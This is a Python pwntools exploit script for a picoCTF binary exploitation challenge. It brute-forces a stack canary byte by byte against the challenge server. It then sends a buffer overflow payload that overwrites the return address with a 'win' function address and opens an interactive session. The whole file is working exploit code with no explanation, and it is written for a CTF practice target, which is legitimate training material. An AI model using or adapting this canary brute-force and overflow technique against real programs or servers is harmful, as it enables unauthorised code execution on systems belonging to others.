from pwn import *
context.binary = "./vuln"
win_func = 0x8049336
canary = b''
x = 0
while x <4:
    for i in range(0,0xff):
        p = remote("saturn.picoctf.net",56083)
        print(p.recv())
        #p = process()
        p.sendline(b'-1')
        p.recv()
        #print(p.recv().decode())
        testing_number = i
        bytes_testing = testing_number.to_bytes(1,'little')
        payload = cyclic(64)+canary+ bytes_testing #+p32(win_func)
        log.info("Testing number %d; Payload %s", testing_number, payload)
        p.send(payload)
        #time.sleep(0.1)
        try:
            msg = p.recv()
            print(msg)
            if b'Stack Smashing Detected' not in msg:
                canary += testing_number.to_bytes(1,'little')
                break
        except Exception:
            pass
        p.close()
    x+=1
log.success('Final canary: %s', canary)
p = remote("saturn.picoctf.net",56083)
print(p.recv())
p.sendline(b'-1')
p.recv()
payload = cyclic(64)+canary+b'B'*16+p32(win_func)
p.send(payload)
p.interactive()
#BiRd